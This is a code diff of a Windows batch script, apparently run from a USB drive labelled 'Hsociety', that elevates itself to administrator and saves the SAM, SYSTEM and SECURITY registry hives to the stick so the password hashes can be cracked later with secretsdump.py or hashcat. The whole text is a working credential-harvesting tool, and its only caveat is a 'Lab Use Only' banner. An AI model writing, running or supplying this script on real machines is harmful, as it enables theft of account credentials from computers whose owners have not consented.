@@ -1,43 +1,59 @@
-::in progress
 @echo off
 setlocal EnableDelayedExpansion
-:: Check for admin
+title Hash Dump Utility
+color 0A
+
+:: ===============================
+:: Wsuits6 Hash Dump Tool (Lab Use Only)
+:: ===============================
+
+:: ---- Check for Administrator ----
 net session >nul 2>&1
 if %errorlevel% neq 0 (
-    echo [!] Not running as administrator. Relaunching with admin rights...
-    powershell -Command "Start-Process '%~f0' -Verb runAs"
+    echo [!] Not running as administrator. Relaunching with elevated rights...
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
     exit /b
 )
 
-:: Set USB label and folder
-set "usbLabel=Hsociety"
-set "mainFolder=HashDumps"
+:: ---- Configuration ----
+set "USB_LABEL=Hsociety"
+set "MAIN_FOLDER=HashDumps"
 
-:: Find USB drive by label
-for /f "tokens=1,2*" %%A in ('wmic logicaldisk get name^, volumename ^| findstr /I "%usbLabel%"') do (
-    set "usbDrive=%%A"
+:: ---- Detect USB Drive by Label ----
+for /f "tokens=1,2*" %%A in ('wmic logicaldisk get name^, volumename ^| findstr /I "%USB_LABEL%"') do (
+    set "USB_DRIVE=%%A"
 )
 
-if not defined usbDrive (
-    echo [ERROR] USB with label '%usbLabel%' not found.
+if not defined USB_DRIVE (
+    echo [ERROR] USB with label "%USB_LABEL%" not found.
     pause
     exit /b
 )
 
-:: Get PC name and timestamp
-for /f %%C in ('hostname') do set "pcName=%%C"
-for /f %%D in ('wmic os get localdatetime ^| find "."') do set "datetime=%%D"
-set "datetime=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2!_!datetime:~8,2!-!datetime:~10,2!-!datetime:~12,2!"
+:: ---- Get Hostname and Timestamp ----
+for /f %%C in ('hostname') do set "PC_NAME=%%C"
+for /f %%D in ('wmic os get localdatetime ^| find "."') do set "DATETIME=%%D"
+set "DATETIME=!DATETIME:~0,4!-!DATETIME:~4,2!-!DATETIME:~6,2!_!DATETIME:~8,2!-!DATETIME:~10,2!-!DATETIME:~12,2!"
 
-:: Create folder
-set "outputDir=%usbDrive%\%mainFolder%\%pcName%_%datetime%"
-mkdir "%outputDir%"
+:: ---- Create Output Directory ----
+set "OUTPUT_DIR=%USB_DRIVE%\%MAIN_FOLDER%\%PC_NAME%_%DATETIME%"
+mkdir "%OUTPUT_DIR%" >nul 2>&1
 
-echo [+] Dumping SAM, SYSTEM, and SECURITY hives...
-reg save HKLM\SAM "%outputDir%\SAM"
-reg save HKLM\SYSTEM "%outputDir%\SYSTEM"
-reg save HKLM\SECURITY "%outputDir%\SECURITY"
+echo [+] Output directory created at: %OUTPUT_DIR%
 
-echo [!] Hashes saved. Crack later with secretsdump.py or hashcat.
+:: ---- Save Registry Hives ----
+echo [+] Saving SAM, SYSTEM, and SECURITY registry hives...
+reg save HKLM\SAM "%OUTPUT_DIR%\SAM" >nul 2>&1
+reg save HKLM\SYSTEM "%OUTPUT_DIR%\SYSTEM" >nul 2>&1
+reg save HKLM\SECURITY "%OUTPUT_DIR%\SECURITY" >nul 2>&1
+
+if %errorlevel% neq 0 (
+    echo [!] Failed to save one or more registry hives. Check permissions.
+) else (
+    echo [+] Registry hives saved successfully.
+)
+
+:: ---- Finish ----
+echo [!] Hashes are saved. You can process them later with tools like secretsdump.py or hashcat.
 pause
-exit
+exit /b
